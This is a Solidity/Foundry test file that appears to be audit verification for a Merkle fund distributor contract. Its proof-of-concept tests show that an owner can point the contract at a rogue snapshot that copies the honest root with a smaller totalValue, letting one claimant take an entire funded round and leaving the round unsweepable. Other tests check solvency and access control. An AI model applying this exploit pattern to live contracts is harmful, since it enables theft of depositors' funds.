// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test, console2, stdError} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {MerkleFundDistributor} from "src/merkle/MerkleFundDistributor.sol";
import {IMerkleFundDistributor} from "interfaces/IMerkleFundDistributor.sol";
import {IMerkleSnapshot} from "interfaces/merkle/IMerkleSnapshot.sol";

contract VSnap is IMerkleSnapshot {
    MerkleState internal _s;

    function set(bytes32 root, uint256 totalValue) external {
        _s = MerkleState({
            blockNumber: block.number,
            timestamp: block.timestamp,
            root: root,
            ipfsHash: keccak256("blob"),
            ipfsHashCid: "cid",
            totalValue: totalValue
        });
    }

    function getLatestState() external view returns (MerkleState memory) {
        return _s;
    }
}

contract VTok is ERC20 {
    constructor() ERC20("V", "V") {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }
}

contract VerifyDistributor is Test {
    VSnap honest;
    VTok token;
    MerkleFundDistributor dist;

    address owner = address(0x0A);
    address funder = address(0xF00D);
    address alice = address(0xA1);
    address bob = address(0xB0);

    bytes32 lAlice;
    bytes32 lBob;
    bytes32 honestRoot;

    function _leaf(address a, uint256 v) internal pure returns (bytes32) {
        return keccak256(bytes.concat(keccak256(abi.encode(a, v))));
    }

    function _pair(bytes32 a, bytes32 b) internal pure returns (bytes32) {
        return a <= b ? keccak256(abi.encode(a, b)) : keccak256(abi.encode(b, a));
    }

    function setUp() public {
        honest = new VSnap();
        token = new VTok();
        // Honest proven tree: alice 600, bob 400, totalValue 1000 (the guest's `total_value`
        // is by construction the exact sum of the leaves it put in the tree).
        lAlice = _leaf(alice, 600);
        lBob = _leaf(bob, 400);
        honestRoot = _pair(lAlice, lBob);
        honest.set(honestRoot, 1000);
        // Exactly the factory terms: owner = admin, feeRecipient = admin, fee 0, allowlist off.
        dist = new MerkleFundDistributor(owner, address(honest), owner, 0, false);
        token.mint(funder, 1_000_000 ether);
        vm.prank(funder);
        token.approve(address(dist), type(uint256).max);
    }

    /*//////////////////////////////////////////////////////////////
      1. THE REFUTATION THAT FAILS: `expectedRoot` pins the ROOT but
         NOT `totalMerkleValue`. A rogue snapshot that mirrors the
         honest root and shrinks the denominator defeats the guard.
    //////////////////////////////////////////////////////////////*/
    function test_ExpectedRootDoesNotPinTotalMerkleValue() public {
        // The rogue snapshot returns the SAME root the frontend read from the real snapshot,
        // so the funder's `expectedRoot` check passes. Only `totalValue` is manipulated.
        VSnap rogue = new VSnap();
        rogue.set(honestRoot, 600); // == alice's leaf value

        vm.prank(owner);
        dist.setMerkleSnapshot(address(rogue));

        // The funder does everything the production UI does: pins the proven root.
        vm.prank(funder);
        uint256 idx = dist.distribute(address(token), 100 ether, honestRoot);

        IMerkleFundDistributor.DistributionState memory d = dist.getDistribution(idx);
        assertEq(d.root, honestRoot, "the funder's root guard passed");
        assertEq(d.totalMerkleValue, 600, "but the denominator is the owner's number");

        // alice (the owner's own account in the real attack) takes 100% of a round the honest
        // scoreboard says she is owed 60% of.
        bytes32[] memory pA = new bytes32[](1);
        pA[0] = lBob;
        uint256 got = dist.claim(idx, alice, 600, pA);
        assertEq(got, 100 ether, "one leaf took the entire round despite expectedRoot");

        // bob's real 40% entitlement is now unbacked.
        bytes32[] memory pB = new bytes32[](1);
        pB[0] = lAlice;
        vm.expectRevert();
        dist.claim(idx, bob, 400, pB);
    }

    /// The M-7 guarded overload (maxFeeAmount + expectedFeeRecipient + expectedRoot) does not
    /// help either: it guards the fee, not the denominator.
    function test_GuardedOverloadDoesNotCoverTotalMerkleValue() public {
        VSnap rogue = new VSnap();
        rogue.set(honestRoot, 600);
        vm.prank(owner);
        dist.setMerkleSnapshot(address(rogue));

        vm.prank(funder);
        uint256 idx = dist.distribute(address(token), 100 ether, honestRoot, 0, 0, owner);

        bytes32[] memory pA = new bytes32[](1);
        pA[0] = lBob;
        assertEq(dist.claim(idx, alice, 600, pA), 100 ether, "every M-7 guard satisfied, round still taken");
    }

    /*//////////////////////////////////////////////////////////////
      2. THE SOLVENCY QUESTION: with a CONSISTENT (root, totalValue)
         pair — which is what the guest proves — claims can never
         exceed the round's own funding, so no cross-round drain.
    //////////////////////////////////////////////////////////////*/
    function test_HonestSnapshotCannotOverDistributeAcrossRounds() public {
        address funderB = address(0xF2);
        token.mint(funderB, 1_000 ether);
        vm.prank(funderB);
        token.approve(address(dist), type(uint256).max);

        vm.prank(funder);
        uint256 r0 = dist.distribute(address(token), 100 ether, honestRoot);
        vm.prank(funderB);
        uint256 r1 = dist.distribute(address(token), 700 ether, honestRoot);

        bytes32[] memory pA = new bytes32[](1);
        pA[0] = lBob;
        bytes32[] memory pB = new bytes32[](1);
        pB[0] = lAlice;

        dist.claim(r0, alice, 600, pA);
        dist.claim(r0, bob, 400, pB);
        dist.claim(r1, alice, 600, pA);
        dist.claim(r1, bob, 400, pB);

        IMerkleFundDistributor.DistributionState memory d0 = dist.getDistribution(r0);
        IMerkleFundDistributor.DistributionState memory d1 = dist.getDistribution(r1);
        assertLe(d0.amountDistributed, d0.amountFunded - d0.feeAmount, "round 0 stayed inside its own funding");
        assertLe(d1.amountDistributed, d1.amountFunded - d1.feeAmount, "round 1 stayed inside its own funding");
        // Every wei is accounted for; dust stays put, nothing crossed rounds.
        assertEq(token.balanceOf(address(dist)), 800 ether - d0.amountDistributed - d1.amountDistributed);
        console2.log("r0 residual dust", 100 ether - d0.amountDistributed);
        console2.log("r1 residual dust", 700 ether - d1.amountDistributed);
    }

    /// Fuzz the same statement: for ANY consistent (sum of leaf values == totalValue) tree,
    /// the sum of the two claims never exceeds the round's distributable.
    function testFuzz_ConsistentTreeNeverOverDistributes(uint96 va, uint96 vb, uint96 amount) public {
        vm.assume(va > 0 && vb > 0);
        uint256 amt = bound(uint256(amount), 1 ether, 1_000 ether);
        bytes32 la = _leaf(alice, va);
        bytes32 lb = _leaf(bob, vb);
        VSnap s = new VSnap();
        s.set(_pair(la, lb), uint256(va) + uint256(vb)); // CONSISTENT: total == sum of leaves
        vm.prank(owner);
        dist.setMerkleSnapshot(address(s));

        vm.prank(funder);
        uint256 idx = dist.distribute(address(token), amt, bytes32(0));

        bytes32[] memory pa = new bytes32[](1);
        pa[0] = lb;
        bytes32[] memory pb = new bytes32[](1);
        pb[0] = la;
        try dist.claim(idx, alice, va, pa) {} catch {}
        try dist.claim(idx, bob, vb, pb) {} catch {}

        IMerkleFundDistributor.DistributionState memory d = dist.getDistribution(idx);
        assertLe(d.amountDistributed, d.amountFunded - d.feeAmount, "consistent tree over-distributed");
    }

    /*//////////////////////////////////////////////////////////////
      3. Blast radius: once a round over-distributes, `sweep` on that
         round underflows FOREVER (checked arithmetic), so even the
         funder's documented exit is gone.
    //////////////////////////////////////////////////////////////*/
    function test_OverDistributedRoundCanNeverBeSwept() public {
        VSnap rogue = new VSnap();
        bytes32 rl = _leaf(alice, 50 ether);
        rogue.set(rl, 1);
        vm.prank(owner);
        dist.setMerkleSnapshot(address(rogue));

        // fund a real round first so the balance is there to take
        vm.prank(funder);
        dist.distribute(address(token), 100 ether, bytes32(0));

        vm.prank(funder);
        uint256 bad = dist.distribute(address(token), 1, bytes32(0), uint64(block.timestamp + 1 days));
        bytes32[] memory none = new bytes32[](0);
        dist.claim(bad, alice, 50 ether, none);

        vm.warp(block.timestamp + 2 days);
        vm.expectRevert(stdError.arithmeticError);
        dist.sweep(bad);
    }

    /*//////////////////////////////////////////////////////////////
      4. Can a NON-owner reach an inconsistent (root, totalValue)?
         No: `merkleSnapshot` is the only source and only the owner
         may move it. This is the reachability boundary of C2/C3.
    //////////////////////////////////////////////////////////////*/
    function test_NonOwnerCannotRepointTheSnapshot() public {
        VSnap rogue = new VSnap();
        rogue.set(honestRoot, 1);
        vm.prank(address(0xBAD));
        vm.expectRevert(IMerkleFundDistributor.NotOwner.selector);
        dist.setMerkleSnapshot(address(rogue));
    }
}
